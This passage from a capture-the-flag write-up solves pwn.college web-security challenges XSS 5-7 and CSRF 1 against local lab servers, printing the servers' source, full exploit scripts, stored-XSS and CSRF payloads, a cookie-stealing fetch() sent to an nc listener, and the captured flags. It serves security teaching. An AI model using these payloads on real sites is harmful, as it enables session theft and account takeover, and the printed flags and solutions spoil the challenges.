- Publish the draft payload, so that it can be triggered by the `admin`

For our payload we will have to use the `fetch()` API. 
It provides a JavaScript interface for making HTTP requests and processing the responses, which is exactly what we need.

#### Exploit

```py title="~/exploit.py" showLineNumbers
import requests

login_url = "http://challenge.localhost:80/login"
draft_url = "http://challenge.localhost:80/draft"
publish_url = "http://challenge.localhost:80/publish"

# Login credentials
login_data = {
    "username": "hacker",
    "password": "1337"
}

# XSS payload
payload_draft = {
    "content": '<script>fetch("http://challenge.localhost:80/publish", {method: "GET", credentials: "include"});</script>'
}

with requests.Session() as session:
    # Step 1: Log in
    login_response = session.post(login_url, data = login_data)
    print("[+] Login response:")
    print(login_response.text)
    print("\n")

    # Step 2: Draft malicious payload
    draft_response = session.post(draft_url, data = payload_draft)
    print("[+] Draft response:")
    print(draft_response.text)
    print("\n")

    # Step 2: Publish malicious post
    publish_response = session.get(publish_url)
    print("[+] Publish response:")
    print(publish_response.text)
```

```
hacker@web-security~xss-5:/$ python ~/exploit.py 
[+] Login response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <a href=publish>Publish your drafts!</a>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>


[+] Draft response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <a href=publish>Publish your drafts!</a>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2>(Draft post, showing first 12 characters):<br><script>fetc<hr></body></html>


[+] Publish response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <a href=publish>Publish your drafts!</a>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:80/publish", {method: "GET", credentials: "include"});</script><hr>
</body></html>
````

Great, we can see that out payload was first put into the drafts, and then published.
Let's cause the `admin` to trigger the payload.

```
hacker@web-security~xss-5:/$ /challenge/victim 
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
Visiting http://challenge.localhost:80/
Visited! Go check if the attack worked!
```

Since the `admin` triggered the payload successfully, their post containing the flag must be published.

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/login"
data = {
    "username": "hacker",
    "password": "1337"
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~xss-5:/$ python ~/script.py
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <a href=publish>Publish your drafts!</a>
            <hr>
        <h2>Author: admin</h2>pwn.college{c5gbzp4Rtz-r5_BHifsc6nyVbyB.dZTOzMDL4ITM0EzW}<hr>
<h2>Author: hacker</h2><script>fetch("http://challenge.localhost:80/publish", {method: "GET", credentials: "include"});</script><hr>
```

&nbsp;

## XSS 6

### Source code
```py title="challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")


@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["username"] = username
    return flask.redirect("/")


@app.route("/draft", methods=["POST"])
def challenge_draft():
    username = flask.session.get("username", None)
    if not username:
        flask.abort(403, "Log in first!")

    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, username, bool(flask.request.form.get("publish"))),
    )
    return flask.redirect("/")


@app.route("/publish", methods=["POST"])
def challenge_publish():
    username = flask.session.get("username", None)
    if not username:
        flask.abort(403, "Log in first!")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
    return flask.redirect("/")


@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
    username = flask.session.get("username", None)
    if username:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim" showLineNumbers
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

challenge_url = "http://challenge.localhost:80/"

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(open("/flag").read().strip())
browser.find_element(By.NAME, "submit").submit()

time.sleep(2)
print("Visited! Go check if the attack worked!")
```

### Stored XSS

This time we have to make a POST request to the `/publish` endpoint in order to publish the drafts.

#### Exploit
```py title="~/exploit.py" showLineNumbers
import requests

login_url = "http://challenge.localhost:80/login"
draft_url = "http://challenge.localhost:80/draft"
publish_url = "http://challenge.localhost:80/publish"

# Login credentials
login_data = {
    "username": "hacker",
    "password": "1337"
}

# XSS payload
payload_draft = {
    "content": '<script>fetch("http://challenge.localhost:80/publish", {method: "POST", credentials: "include"});</script>'
}

with requests.Session() as session:
    # Step 1: Log in
    login_response = session.post(login_url, data = login_data)
    print("[+] Login response:")
    print(login_response.text)
    print("\n")

    # Step 2: Draft malicious payload
    draft_response = session.post(draft_url, data = payload_draft)
    print("[+] Draft response:")
    print(draft_response.text)
    print("\n")

    # Step 2: Publish malicious post
    publish_response = session.post(publish_url)
    print("[+] Publish response:")
    print(publish_response.text)
```

```
hacker@web-security~xss-6:/$ python ~/exploit.py 
[+] Login response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>


[+] Draft response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2>(Draft post, showing first 12 characters):<br><script>fetc<hr></body></html>


[+] Publish response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:80/publish", {method: "POST", credentials: "include"});</script><hr>
</body></html>
```

Great, we can see that out payload was first put into the drafts, and then published. Let's cause the `admin` to trigger the payload.

```
hacker@web-security~xss-6:/$ /challenge/victim 
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
Visiting http://challenge.localhost:80/
Visited! Go check if the attack worked!
```

Since the `admin` triggered the payload successfully, their post containing the flag must be published.

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/login"
data = {
    "username": "hacker",
    "password": "1337"
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~xss-6:/$ python ~/script.py 
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>pwn.college{c--rBmVAr6pgAQFpf4vKhi4GysV.dBDO1YDL4ITM0EzW}<hr>
<h2>Author: hacker</h2><script>fetch("http://challenge.localhost:80/publish", {method: "POST", credentials: "include"});</script><hr>
</body></html>
```

&nbsp;

## XSS 7

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")


@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect("/")
    response.set_cookie("auth", username + "|" + password)
    return response


@app.route("/draft", methods=["POST"])
def challenge_draft():
    username, password = flask.request.cookies.get("auth", "|").split("|")
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, username, bool(flask.request.form.get("publish"))),
    )
    return flask.redirect("/")


@app.route("/publish", methods=["POST"])
def challenge_publish():
    username, password = flask.request.cookies.get("auth", "|").split("|")
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
    return flask.redirect("/")


@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
    username, password = flask.request.cookies.get("auth", "|").split("|")
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if user:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            elif post["author"] == username:
                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim" showLineNumbers
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

challenge_url = "http://challenge.localhost:80/"

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(open("/flag").read().strip()[-20:])
browser.find_element(By.NAME, "submit").submit()

time.sleep(2)
print("Visited! Go check if the attack worked!")
```

### Cookie exfiltration via XSS

This time, we have to exfiltrate the `auth` cookie for `admin` which is in the format `username|password`.
Using these creds, we can log in as `admin` and view the flag.

```py title="~/exploit.py" showLineNumbers
import requests

login_url = "http://challenge.localhost:80/login"
draft_url = "http://challenge.localhost:80/draft"
publish_url = "http://challenge.localhost:80/publish"

# Login credentials
login_data = {
    "username": "hacker",
    "password": "1337"
}

# XSS payload to exfiltrate cookie
payload_draft = {
    "content": '<script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script>'
}

with requests.Session() as session:
    # Step 1: Log in
    login_response = session.post(login_url, data = login_data)
    print("[+] Login response:")
    print(login_response.text)
    print("\n")

    # Step 2: Draft malicious payload
    draft_response = session.post(draft_url, data = payload_draft)
    print("[+] Draft response:")
    print(draft_response.text)
    print("\n")

    # Step 2: Publish malicious post
    publish_response = session.post(publish_url)
    print("[+] Publish response:")
    print(publish_response.text)
```

```
hacker@web-security~xss-7:/$ python ~/script.py 
[+] Login response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>


[+] Draft response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><b>YOUR DRAFT POST:</b> <script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
</body></html>


[+] Publish response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
</body></html>
```

Now that our payload is delivered, let's setup a listener.

```
hacker@web-security~xss-7:/$ nc -nvlp 9999
Listening on 0.0.0.0 9999
```

Now, let's simulate the victim.

```
hacker@web-security~xss-7:/$ /challenge/victim
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
Visiting http://challenge.localhost:80/
Visited! Go check if the attack worked!
```

Looking at out listener, we can see that we have the `auth` cookie.

```
hacker@web-security~xss-7:/$ nc -nvlp 9999
Listening on 0.0.0.0 9999
Connection received on 127.0.0.1 37682
GET /?cookie=auth%3Dadmin%7CJv.dJDO1YDL4ITM0EzW%7D HTTP/1.1
Host: localhost:9999
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://challenge.localhost/
Origin: http://challenge.localhost
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4
```

Let's log in using these credentials.

```py title="~/script.py" showLineNumbers
import requests

login_url = "http://challenge.localhost:80/login"

# Login credentials
login_data = {
    "username": "admin",
    "password": "Jv.dJDO1YDL4ITM0EzW}"
}

with requests.Session() as session:
    # Step 1: Log in
    login_response = session.post(login_url, data = login_data)
    print("[+] Login response:")
    print(login_response.text)
```

```
hacker@web-security~xss-7:/$ python ~/script.py 
[+] Login response:
<html><body>
Welcome to pwnpost, now with users!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
            <hr>
        <h2>Author: admin</h2><b>YOUR DRAFT POST:</b> pwn.college{AzeMT4xBcTDZsDMZpjzaKnLHWJv.dJDO1YDL4ITM0EzW}<hr>
<h2>Author: hacker</h2><script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
</body></html>
```

&nbsp;

## CSRF 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")

@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["username"] = username
    return flask.redirect("/")

@app.route("/draft", methods=["POST"])
def challenge_draft():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, flask.session.get("username"), bool(flask.request.form.get("publish")))
    )
    return flask.redirect("/")

@app.route("/publish", methods=["GET"])
def challenge_publish():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
    return flask.redirect("/")

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now XSS-free (for admin, at least)!<hr>\n"
    username = flask.session.get("username", None)
    if username == "admin":
        page += """<b>To prevent XSS, the admin does not view messages!</b>"""
    elif username:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br><a href=publish>Publish your drafts!</a><hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim" showLineNumbers
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)
challenge_url = "http://challenge.localhost:80/"
flag = open("/flag").read().strip()

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

print("Logging in as admin...")
browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(flag)
browser.find_element(By.NAME, "submit").submit()
time.sleep(3)
print("Logged in!")

print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
browser.get("http://hacker.localhost:1337/")
time.sleep(3)

print("Visited! Go check if the attack worked!")
```

### CSRF

This time, we have to perform a Cross-Site Request Forgery attack in order to make the `admin` puublish the draft which contains the flag.

Basically, the steps are:
- Craft a malicious payload which uses `form` in order to make a request to `/publish`
- Host the payload on a malicious site on port `1337` 
- Make the `admin` trigger the payload when they visit our page (done automatically by the `/challenge/victim`)
- Login as either the `hacker` or `guest` user and read the flag

#### Payload

```html title="~/index.html" showLineNumbers
<!-- csrf1.html -->
<!DOCTYPE html>
<html>
  <body>
    <form action="http://challenge.localhost/publish" method="GET" id="csrf-form">
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

Let's spin up our site.

```
hacker@web-security~csrf-1:~$ python3 -m http.server 1337 --bind hacker.localhost
Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ..
```

Now, let's run the victim script.

```
hacker@web-security~csrf-1:/$ /challenge/victim 
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Visiting http://challenge.localhost:80/
Logging in as admin...
Logged in!
Visiting the attacker's website (http://hacker.localhost:1337/)...
Visited! Go check if the attack worked!
```

Looking at our python server, we can see that the request to `/publish` was triggered.

```
hacker@web-security~csrf-1:~$ python3 -m http.server 1337 --bind hacker.localhost
Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ...
127.0.0.1 - - [14/Jun/2025 13:40:56] "GET / HTTP/1.1" 200 -
```

We can even verify by checking the challenge server's logs.

```
hacker@web-security~csrf-1:/$ /challenge/server 
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://challenge.localhost:80
Press CTRL+C to quit
127.0.0.1 - - [14/Jun/2025 13:40:53] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [14/Jun/2025 13:40:53] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [14/Jun/2025 13:40:53] "POST /login HTTP/1.1" 302 -
127.0.0.1 - - [14/Jun/2025 13:40:53] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [14/Jun/2025 13:40:56] "GET /publish HTTP/1.1" 302 -
127.0.0.1 - - [14/Jun/2025 13:40:56] "GET / HTTP/1.1" 200 -
```

Now that the draft containing the flag is published, we can login as `hacker` or `guest` and read it.

```python title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/login"
data = {
    "username": "hacker",
    "password": "1337"
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~csrf-1:/$ python ~/script.py 
<html><body>
Welcome to pwnpost, now XSS-free (for admin, at least)!<hr>

            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br><a href=publish>Publish your drafts!</a><hr>
        <h2>Author: admin</h2>pwn.college{wMiuYIlcUXToOhP6b3ydLPs1T7v.ddTOzMDL4ITM0EzW}<hr>
</body></html>
```
